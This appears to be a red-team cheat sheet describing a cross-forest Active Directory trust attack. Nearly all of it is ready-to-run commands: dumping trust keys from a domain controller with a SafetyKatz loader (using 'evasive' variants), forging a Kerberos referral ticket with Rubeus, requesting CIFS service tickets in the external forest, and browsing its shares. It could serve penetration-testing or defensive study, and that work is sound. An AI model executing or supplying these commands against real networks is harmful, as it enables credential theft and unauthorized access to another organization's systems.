# Cross-Forest Trust Attack

Abuse cross-forest trust key to access explicitly shared resources in a trusted external forest. SID filtering blocks full privilege escalation — only accessible shares/services can be reached.

## Extract Trust Key (for cross-forest trust)
Run from child DC with DA privs:
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
Look for the external forest trust entry: `rc4_hmac_nt` for `<DOMAIN> -> <EXTERNAL_FOREST>`.

## Forge Referral Ticket
```
Loader.exe -path Rubeus.exe -args evasive-silver /service:krbtgt/<LOCAL_DOMAIN> /rc4:<trust_key_rc4> /sid:<local_domain_sid> /ldap /user:Administrator /nowrap
```
Note: No `/sids` — SID history is filtered across forest trusts.

## Request Service Ticket in External Forest
```
Loader.exe -path Rubeus.exe -args asktgs /service:cifs/<EXTERNAL_DC>.<EXTERNAL_FOREST> /dc:<EXTERNAL_DC>.<EXTERNAL_FOREST> /ptt /ticket:<base64_referral>
```

## Access Shared Resources
```
dir \\<EXTERNAL_DC>.<EXTERNAL_FOREST>\<ShareName>\
```

## Notes
- SID filtering prevents privilege escalation across forest trusts
- Only resources explicitly shared with the trusted domain are accessible
- To enumerate accessible services: request TGS for each suspected SPN and try access
